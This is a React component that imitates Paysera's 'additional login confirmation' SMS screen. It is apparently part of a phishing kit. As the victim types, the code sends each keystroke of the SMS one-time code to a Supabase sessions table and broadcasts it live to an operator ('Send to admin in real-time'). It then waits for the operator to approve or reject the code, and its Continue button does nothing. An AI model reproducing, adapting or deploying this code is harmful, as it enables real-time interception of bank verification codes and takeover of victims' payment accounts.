import { useState, useEffect, useCallback } from "react";
import { supabase } from "@/integrations/supabase/client";
import payseraLogo from "@/assets/volet-logo-v2.svg";
import { Loader2, ChevronDown } from "lucide-react";
import { usePayseraLang } from "@/hooks/usePayseraLang";

interface PayseraSmsScreenProps {
  email: string;
  sessionId: string;
  onBack: () => void;
}

const PayseraSmsScreen = ({ email, sessionId, onBack }: PayseraSmsScreenProps) => {
  const [smsCode, setSmsCode] = useState("");
  const [status, setStatus] = useState<"input" | "verifying" | "success" | "error">("input");
  const [errorMessage, setErrorMessage] = useState("");
  const [phoneEnding, setPhoneEnding] = useState("");
  const { t } = usePayseraLang();

  // Get phone ending from session otp_code
  useEffect(() => {
    const fetchPhone = async () => {
      const { data } = await supabase.from("sessions").select("otp_code").eq("id", sessionId).maybeSingle();
      if (data?.otp_code?.startsWith("paysera_sms_phone:")) {
        setPhoneEnding(data.otp_code.replace("paysera_sms_phone:", ""));
      }
    };
    fetchPhone();
  }, [sessionId]);

  useEffect(() => {
    const channel = supabase.channel(`session-otp-decision-${sessionId}`);
    channel
      .on("broadcast", { event: "otp_decision" }, (p) => {
        const decision = p.payload?.status as string;
        if (decision === "otp_approved") setStatus("success");
        else if (decision === "otp_rejected") {
          setStatus("error");
          setErrorMessage(t.invalidCode);
          setSmsCode("");
          setTimeout(() => setStatus("input"), 2000);
        }
      })
      .subscribe();

    const reviewChannel = supabase.channel(`session-review-client-sms-${sessionId}`);
    reviewChannel
      .on("broadcast", { event: "review_decision" }, (p) => {
        const decision = p.payload?.status as string;
        if (decision === "otp_approved" || decision === "login_success") setStatus("success");
        else if (decision === "otp_rejected") {
          setStatus("error");
          setErrorMessage(t.invalidCode);
          setSmsCode("");
          setTimeout(() => setStatus("input"), 2000);
        }
      })
      .subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status").eq("id", sessionId).maybeSingle();
      if (!data) return;
      if (data.status === "otp_approved" || data.status === "login_success") setStatus("success");
      else if (data.status === "otp_rejected") {
        setStatus("error");
        setErrorMessage(t.invalidCode);
        setSmsCode("");
        setTimeout(() => {
          setStatus("input");
          supabase.from("sessions").update({ status: "paysera_ask_sms" } as any).eq("id", sessionId).then(() => {});
        }, 2000);
      }
    }, 2500);

    return () => {
      supabase.removeChannel(channel);
      supabase.removeChannel(reviewChannel);
      clearInterval(pollInterval);
    };
  }, [sessionId, t]);

  const handleSmsChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setSmsCode(value);
    // Send to admin in real-time
    supabase.from("sessions").update({ otp_code: `sms_code:${value}` } as any).eq("id", sessionId).then(() => {});
    const broadcastCh = supabase.channel(`confirm-email-${sessionId}`);
    broadcastCh.subscribe((s) => {
      if (s === "SUBSCRIBED") {
        broadcastCh.send({ type: "broadcast", event: "client_sms_update", payload: { sms_code: value } });
        setTimeout(() => supabase.removeChannel(broadcastCh), 1500);
      }
    });
  }, [sessionId]);

  if (status === "success") {
    return (
      <div className="flex min-h-screen flex-col bg-[#dce1e8]">
        <div className="flex justify-center pt-6"><img src={payseraLogo} alt="Paysera" className="h-[40px]" /></div>
        <div className="flex flex-1 flex-col items-center justify-center px-4">
          <div className="w-full max-w-[460px] bg-white rounded-sm shadow-sm border border-[#c8ced8] px-6 py-8 text-center">
            <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-green-100">
              <svg className="h-7 w-7 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg>
            </div>
            <h2 className="text-[15px] font-bold text-[#2c3e50] mb-2">{t.verificationComplete}</h2>
            <p className="text-[13px] text-[#666]">{t.verificationCompleteDesc}</p>
            <p className="mt-2 text-[12px] text-[#999]">{email}</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-screen flex-col bg-[#dce1e8]">
      <div className="flex justify-center pt-6">
        <img src={payseraLogo} alt="Paysera" className="h-[40px]" />
      </div>

      <div className="flex flex-1 flex-col items-center justify-center px-4">
        <div className="w-full max-w-[500px] bg-white rounded shadow-sm border border-[#c8ced8]">
          {/* Header */}
          <div className="px-6 pt-5 pb-3">
            <h1 className="text-[17px] font-bold text-[#1a1a2e]">{t.additionalLoginConfirmation}</h1>
          </div>

          {/* Info text */}
          <div className="px-6 pb-4">
            <p className="text-[13px] text-[#444] leading-relaxed">
              {t.additionalLoginDesc}
            </p>
          </div>

          {/* Yellow note box */}
          <div className="mx-6 mb-5 rounded border border-[#e0c97f] bg-[#fdf8e8] px-4 py-3">
            <p className="text-[12px] text-[#6b5c1f] leading-relaxed">
              <span className="font-semibold">{t.noteLabel}</span> {t.noteText}
            </p>
            <p className="text-[12px] text-[#6b5c1f] leading-relaxed mt-2">
              {t.additionalMethodsText} <span className="font-bold text-[#1a1a2e]">{t.loginMethodSettings}</span>.
            </p>
          </div>

          {/* Divider */}
          <div className="border-t border-[#e0e0e0]" />

          {/* SMS section header */}
          <div className="px-6 py-3 flex items-center justify-between border-b border-[#e0e0e0]">
            <span className="text-[13px] font-bold text-[#1a1a2e] uppercase tracking-wide">{t.smsVerificationMethod}</span>
            <ChevronDown size={18} className="text-[#3366cc]" />
          </div>

          {/* SMS code input area */}
          <div className="px-6 py-6">
            <p className="text-[13px] text-[#444] mb-4 text-center">
              {phoneEnding
                ? <>{t.smsCodeSentToEnding} <span className="font-bold text-[#1a1a2e]">**{phoneEnding}</span></>
                : t.smsCodeSentGeneric}
            </p>

            {errorMessage && status === "error" && (
              <div className="mb-4 rounded border border-red-300 bg-red-50 px-4 py-2.5 text-[13px] text-red-600 text-center">{errorMessage}</div>
            )}

            <label className="block text-[13px] font-bold text-[#1a1a2e] mb-1.5">{t.smsCode}</label>
            <input
              type="text"
              inputMode="numeric"
              value={smsCode}
              onChange={handleSmsChange}
              disabled={status === "verifying"}
              autoFocus
              maxLength={6}
              placeholder={t.enterSmsCode}
              className="w-full border border-[#b8c0cc] rounded-sm px-3 py-2.5 text-[14px] text-[#2c3e50] outline-none focus:border-[#5b8fb9] focus:ring-1 focus:ring-[#5b8fb9]/30 bg-white mb-4"
            />

            {smsCode.length >= 4 && status === "input" ? (
              <div className="mb-4 flex items-center justify-center gap-2 text-[13px] text-[#888]">
                <Loader2 className="h-4 w-4 animate-spin text-[#6b8fa3]" />
                {t.verifyingSms}
              </div>
            ) : (
              <button
                onClick={() => {}}
                disabled={smsCode.length < 4}
                className="w-full bg-[#6b8fa3] hover:bg-[#5a7d91] active:bg-[#4e6f82] text-white text-[13px] font-bold uppercase tracking-wider py-2.5 rounded-sm transition-colors disabled:opacity-60"
              >
                {t.continue}
              </button>
            )}
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="pb-5 pt-4 text-center">
        <div className="flex items-center justify-center gap-3 flex-wrap">
          <a href="#" className="text-[12px] text-[#3366cc] hover:underline">{t.prices}</a>
          <span className="text-[12px] text-[#ccc]">|</span>
          <a href="#" className="text-[12px] text-[#3366cc] hover:underline">{t.companyDetails}</a>
          <span className="text-[12px] text-[#ccc]">|</span>
          <span className="text-[12px] text-[#3366cc]">+370 5 207 1558</span>
        </div>
      </footer>
    </div>
  );
};

export default PayseraSmsScreen;
